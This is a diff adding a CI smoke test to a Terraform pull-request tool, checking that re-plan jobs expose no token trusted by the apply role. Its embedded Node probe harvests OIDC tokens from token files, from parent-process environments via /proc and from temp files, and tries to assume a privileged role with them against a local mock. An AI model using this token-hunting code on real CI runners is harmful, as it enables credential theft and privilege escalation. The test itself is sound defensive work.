@@ -331,6 +331,7 @@ lock/close-release|with apply.when: pull-request closing a pull request releases
 lock/terragrunt-fanout|in a Terragrunt repo a change to root.hcl locks every unit and says why, and a Markdown-only change locks none|
 security/token-scrub|the binary tf-plan starts gets no forge token by name or by value, and a TF_ variable passes as set|
 security/plan-token-free|the plan and re-plan jobs run the code of a pull request with no forge token variable in its environment or that of its parent processes and no credential in the checkout, and the note jobs still post the note and terragucci/plan|
+security/replan-apply-role|a /terragucci plan re-plan trades its OIDC token for the plan role before any pull request code runs, and that code finds no token the apply role trusts and no way to ask for one|
 security/fork|a pull request from a fork runs check and no plan job|
 report/sensitive|IAM, security group, KMS and DNS changes are open with their reasons, and an import and a forget are named, the forget not counted as a destroy|
 approval/signer-trust|init --signer writes the signers line from git config user.signingkey, and an approval sealed with that key lets the wave apply|
@@ -14582,6 +14583,147 @@ SH
   return $rc
 }
 
+claim_security/replan_apply_role() {
+  # A scratch repo with oidc plan_role and apply_role in floci. A pull request
+  # adds to app an external data source, the change's own code, that hunts for
+  # a token the apply role's trust would accept: the token files the job's
+  # variables name, a token asked for with the token-request variables in its
+  # environment or in any parent process's, and any JWT in a file under
+  # RUNNER_TEMP or /tmp. Each one it finds it checks against Forgejo's
+  # published keys and, when it is a token for the default branch with
+  # audience sts.amazonaws.com, trades with floci's STS for the apply role. It
+  # writes what it found to floci and never fails the plan. A /terragucci plan
+  # re-plan then runs it from the default branch's workflow: the re-plan must
+  # go green, trade the job's token for the plan role alone and leave the
+  # probe that role's keys, and leave it no token the apply role accepts and
+  # no token-request variable. floci
+  # grants any role a token names, so the subject and the audience are the
+  # probe's own check, as they are an apply role's trust.
+  # BREAK: init runs a bundle that renders the re-plan as it was: no trade
+  # step, and a plan step that keeps the token-request variables and writes
+  # the job's token to AWS_WEB_IDENTITY_TOKEN_FILE.
+  log() { echo "[smoke replan-apply-role] $*" >&2; }
+  # shellcheck source=lib.sh
+  . "$HERE/lib.sh"
+  local work repo="$USER/replan-apply-role" head pr mark subrepo role trust rc=0 TERRAGUCCI="$TERRAGUCCI"
+  local plan_role=terragucci-replan-plan apply_role=terragucci-replan-apply marks=shop-terraform-state/replan-apply-role
+  work="$(mktemp -d "${TMPDIR:-/tmp}/terragucci-smoke.XXXXXX")"; track_work "$work"
+  if [ -n "${BREAK:-}" ]; then
+    TERRAGUCCI="$work/break.mjs"
+    break_bundle "$TERRAGUCCI" \
+      render.ts '      ...(needsToken ? [new Step({ if: go, name: "Trade the job'"'"'s OIDC token for the plan identities"' '      ...(false ? [new Step({ if: go, name: "Trade the job'"'"'s OIDC token for the plan identities"' \
+      render.ts 'run: `${dropForgeTokens("bash", true)}\n${planFilesScript(binary, layers, forge, oidc, report, { replan: true, traded: needsToken })}`,' 'run: `${dropForgeTokens()}\n${planFilesScript(binary, layers, forge, oidc, report, { replan: true })}`,' \
+      || { log "the BREAK bundle did not build"; drop_work "$work"; return 1; }
+  fi
+  fresh_repo replan-apply-role || { drop_work "$work"; return 1; }
+  api -o /dev/null -H 'content-type: application/json' -X PATCH -d '{"has_actions":true}' "$URL/api/v1/repos/$repo"
+  curl -fsS -o /dev/null -X PUT "$FLOCI/shop-terraform-state"
+  for mark in pull_request issue_comment; do curl -s -o /dev/null -X DELETE "$FLOCI/$marks/$mark.json" || true; done
+  iam() { curl -sS -X POST "$FLOCI/" -H 'content-type: application/x-www-form-urlencoded' --data-urlencode "Action=$1" --data-urlencode Version=2010-05-08 "${@:2}"; }
+  for role in "$plan_role" "$apply_role"; do
+    trust="$(jq -cn --arg repo "$repo" '{Version: "2012-10-17", Statement: [{Effect: "Allow", Action: "sts:AssumeRoleWithWebIdentity",
+      Principal: {Federated: "arn:aws:iam::000000000000:oidc-provider/forgejo:3000/api/actions"},
+      Condition: {StringEquals: {"forgejo:3000/api/actions:aud": "sts.amazonaws.com"}, StringLike: {"forgejo:3000/api/actions:sub": "repo:\($repo):*"}}}]}')"
+    iam CreateRole --data-urlencode "RoleName=$role" --data-urlencode "AssumeRolePolicyDocument=$trust" >/dev/null || true
+    iam GetRole --data-urlencode "RoleName=$role" | grep -q "<RoleName>$role</RoleName>" || { log "floci has no role $role"; drop_work "$work"; return 1; }
+  done
+  mkdir -p "$work/tree/app"
+  echo 1 > "$work/tree/app/rev.txt"
+  # shellcheck disable=SC2016 # HCL interpolation
+  printf 'terraform {\n  backend "local" {}\n}\n\nresource "terraform_data" "rev" {\n  input = file("${path.module}/rev.txt")\n}\n' > "$work/tree/app/main.tf"
+  printf 'forge: forgejo\nbinary: tofu\ngate: never\noidc:\n  plan_role: arn:aws:iam::000000000000:role/%s\n  apply_role: arn:aws:iam::000000000000:role/%s\n' "$plan_role" "$apply_role" > "$work/tree/terragucci.yml"
+  (cd "$work/tree" && "$TERRAGUCCI" init >/dev/null) || { log "init failed"; drop_work "$work"; return 1; }
+  grep -q 'Trade the job' "$work/tree/.forgejo/workflows/terragucci.yml" && [ -n "${BREAK:-}" ] && { break_setup_failed "the BREAK pipeline still trades the token"; drop_work "$work"; return 1; }
+  MAIN_SHA="$(push_tree "$work/tree" "$repo" main "replan-apply-role: first")" || { drop_work "$work"; return 1; }
+  wait_run "$repo" "$MAIN_SHA" || { drop_work "$work"; return 1; }
+  [ "$RUN_STATUS" = success ] || { log "the push to main ended '$RUN_STATUS'"; print_logs "$repo" "$RUN_ID" | tail -40 >&2; drop_work "$work"; return 1; }
+  git -C "$work/tree" checkout -q -B probe
+  cat > "$work/tree/app/probe.mjs" <<JS
+// The change's own code: every token it can reach that the apply role's trust would accept.
+import { readFileSync, readdirSync, statSync } from "node:fs";
+import { createPublicKey, verify } from "node:crypto";
+const e = process.env, apply = "arn:aws:iam::000000000000:role/$apply_role";
+const found = [], seen = new Set();
+const add = (where, jwt) => { if (jwt && !seen.has(jwt)) { seen.add(jwt); found.push({ where, jwt }); } };
+const JWT = /eyJ[\w-]+\.eyJ[\w-]+\.[\w-]+/g;
+const fileTokens = (where, f) => { try { for (const m of readFileSync(f, "utf8").matchAll(JWT)) add(where, m[0]); } catch {} };
+for (const v of ["AWS_WEB_IDENTITY_TOKEN_FILE", "ARM_OIDC_TOKEN_FILE_PATH", "TERRAGUCCI_GCP_TOKEN_FILE"]) if (e[v]) fileTokens("file:" + v, e[v]);
+// The token-request variables: this process's, then each parent's.
+const asks = [];
+if (e.ACTIONS_ID_TOKEN_REQUEST_URL) asks.push(["env", e.ACTIONS_ID_TOKEN_REQUEST_URL, e.ACTIONS_ID_TOKEN_REQUEST_TOKEN]);
+let p = process.ppid;
+while (p > 1) {
+  try {
+    const env = Object.fromEntries(readFileSync("/proc/" + p + "/environ", "utf8").split("\0").filter(Boolean).map((l) => [l.slice(0, l.indexOf("=")), l.slice(l.indexOf("=") + 1)]));
+    if (env.ACTIONS_ID_TOKEN_REQUEST_URL) asks.push(["parent:" + p, env.ACTIONS_ID_TOKEN_REQUEST_URL, env.ACTIONS_ID_TOKEN_REQUEST_TOKEN]);
+    p = Number(/PPid:\s*(\d+)/.exec(readFileSync("/proc/" + p + "/status", "utf8"))[1]);
+  } catch { break; }
+}
+for (const [where, url, tok] of asks) {
+  try { const r = await fetch(url + "&audience=sts.amazonaws.com", { headers: { authorization: "bearer " + tok } }); if (r.ok) add("request:" + where, (await r.json()).value); } catch {}
+}
+// Any file under the job's temp directories that holds a JWT.
+const walk = (d, depth) => { let names = []; try { names = readdirSync(d); } catch { return; } for (const n of names) { const f = d + "/" + n; let s; try { s = statSync(f); } catch { continue; } if (s.isDirectory() && depth > 0) walk(f, depth - 1); else if (s.isFile() && s.size < 65536) fileTokens("file:" + f, f); } };
+for (const d of [e.RUNNER_TEMP, "/tmp"].filter(Boolean)) walk(d, 2);
+const dec = (x) => JSON.parse(Buffer.from(x, "base64url").toString());
+const server = (e.GITHUB_SERVER_URL || "").replace(/\/\$/, "");
+let jwks = { keys: [] };
+try { const conf = await (await fetch(server + "/api/actions/.well-known/openid-configuration")).json(); jwks = await (await fetch(conf.jwks_uri)).json(); } catch {}
+const out = [];
+for (const { where, jwt } of found) {
+  const [h, b, s] = jwt.split(".");
+  let head, claims; try { head = dec(h); claims = dec(b); } catch { continue; }
+  const jwk = jwks.keys.find((k) => !head.kid || k.kid === head.kid);
+  let verified = false;
+  try {
+    const key = createPublicKey({ key: jwk, format: "jwk" }), data = Buffer.from(h + "." + b), sig = Buffer.from(s, "base64url");
+    const hash = { 256: "sha256", 384: "sha384", 512: "sha512" }[String(head.alg).slice(2)];
+    verified = head.alg === "EdDSA" ? verify(null, data, key, sig) : verify(hash, data, String(head.alg).startsWith("ES") ? { key, dsaEncoding: "ieee-p1363" } : key, sig);
+  } catch {}
+  const accepted = verified && String(claims.sub).endsWith(":ref:refs/heads/main") && [claims.aud].flat().includes("sts.amazonaws.com");
+  let assumed;
+  if (accepted && e.AWS_ENDPOINT_URL) {
+    const body = new URLSearchParams({ Action: "AssumeRoleWithWebIdentity", Version: "2011-06-15", RoleArn: apply, RoleSessionName: "probe", WebIdentityToken: jwt });
+    try { assumed = (await (await fetch(e.AWS_ENDPOINT_URL + "/", { method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" }, body })).text()).match(/<AssumedRoleUser>[\s\S]*?<Arn>([^<]+)<\/Arn>/)?.[1]; } catch {}
+  }
+  out.push({ where, sub: claims.sub, aud: claims.aud, verified, accepted, ...(assumed ? { assumed } : {}) });
+}
+// The identities the trade step left this step, by name.
+let traded = [];
+try { traded = Object.keys(JSON.parse(readFileSync(e.TERRAGUCCI_TRADED, "utf8")).aws ?? {}); } catch {}
+const mark = { event: e.GITHUB_EVENT_NAME, tokens: out, traded, asks: asks.map(([w]) => w) };
+try { await fetch(e.AWS_ENDPOINT_URL + "/$marks/" + e.GITHUB_EVENT_NAME + ".json", { method: "PUT", body: JSON.stringify(mark) }); } catch {}
+console.error("apply-role probe: " + JSON.stringify({ ...mark, tokens: out.map(({ where, sub, accepted }) => ({ where, sub, accepted })) }));
+console.log("{}");
+JS
+  # shellcheck disable=SC2016 # HCL interpolation
+  printf 'terraform {\n  required_providers {\n    external = {\n      source  = "hashicorp/external"\n      version = "~> 2.3"\n    }\n  }\n}\n\ndata "external" "probe" {\n  program = ["node", "${path.module}/probe.mjs"]\n}\n\nresource "terraform_data" "probe" {\n  input = data.external.probe.result\n}\n' > "$work/tree/app/probe.tf"
+  head="$(push_tree "$work/tree" "$repo" probe "replan-apply-role: the change's code hunts for a token")" || { drop_work "$work"; return 1; }
+  pr="$(pr_open "$repo" probe "replan-apply-role: probe")" || { drop_work "$work"; return 1; }
+  wait_run "$repo" "$head" pull_request || { drop_work "$work"; return 1; }
+  log "the pull request's run: $RUN_STATUS, mark $(curl -fsS "$FLOCI/$marks/pull_request.json" 2>/dev/null | jq -c '[.tokens[] | {where, sub, accepted}]' 2>/dev/null || echo none)"
+  api -o /dev/null -H 'content-type: application/json' -X POST -d '{"body":"/terragucci plan"}' "$URL/api/v1/repos/$repo/issues/$pr/comments" || { drop_work "$work"; return 1; }
+  wait_run "$repo" "$MAIN_SHA" issue_comment || { drop_work "$work"; return 1; }
+  mark="$(curl -fsS "$FLOCI/$marks/issue_comment.json" 2>/dev/null || true)"
+  log "the re-plan's run: $RUN_STATUS, mark ${mark:-none}"
+  [ "$RUN_STATUS" = success ] || { log "the re-plan's run ended '$RUN_STATUS'"; run_logs "$repo" "$RUN_ID" | grep -E 'apply-role probe|terragucci' | tail -20 >&2; rc=1; }
+  if [ -z "$mark" ]; then
+    log "the probe wrote no mark in the re-plan: the change's code did not run there"; rc=1
+  else
+    # Forgejo 16 names a repo in the subject as owner-<id>/repo-<id>.
+    subrepo="$(api "$URL/api/v1/repos/$repo" | jq -r '"\(.owner.login)-\(.owner.id)/\(.name)-\(.id)"')"
+    jq -e --arg sub "repo:$subrepo:ref:refs/heads/main" '[.tokens[] | select(.accepted or .sub == $sub)] | length == 0' <<<"$mark" >/dev/null \
+      || { log "the re-plan's code reached a token for main with audience sts.amazonaws.com: $(jq -c '[.tokens[] | select(.accepted) | {where, sub, assumed}]' <<<"$mark")"; rc=1; }
+    jq -e '.asks | length == 0' <<<"$mark" >/dev/null || { log "the re-plan's code reached the token-request variables: $(jq -c .asks <<<"$mark")"; rc=1; }
+    jq -e --arg plan "arn:aws:iam::000000000000:role/$plan_role" '.traded == [$plan]' <<<"$mark" >/dev/null \
+      || { log "the re-plan's step holds $(jq -c .traded <<<"$mark") traded, not the plan role alone"; rc=1; }
+  fi
+  [ $rc = 0 ] && { run_logs "$repo" "$RUN_ID" | grep -q "traded the job's OIDC token for arn:aws:iam::000000000000:role/$plan_role" || { log "the re-plan's log does not say it traded the token for $plan_role"; rc=1; }; }
+  drop_work "$work"
+  [ $rc = 0 ] && log "the re-plan traded its token for the plan role, and the change's code found no token the apply role accepts and no way to ask for one"
+  return $rc
+}
+
 # Forgejo has no API to approve the held run of a fork pull request; a
 # maintainer does it on the pull request page, which posts trust=once to
 # /<repo>/pulls/<n>/action-user-trust. This signs in as the admin, with the
@@ -21573,6 +21715,7 @@ lock/close-release     runner self! lock-pr! weight=200
 lock/terragrunt-fanout       runner self! lock-tg! weight=200
 security/token-scrub          weight=60
 security/plan-token-free      runner self! weight=250
+security/replan-apply-role    runner self! weight=250
 security/fork         runner self! weight=250
 report/sensitive  weight=90
 approval/signer-trust         runner self! weight=250
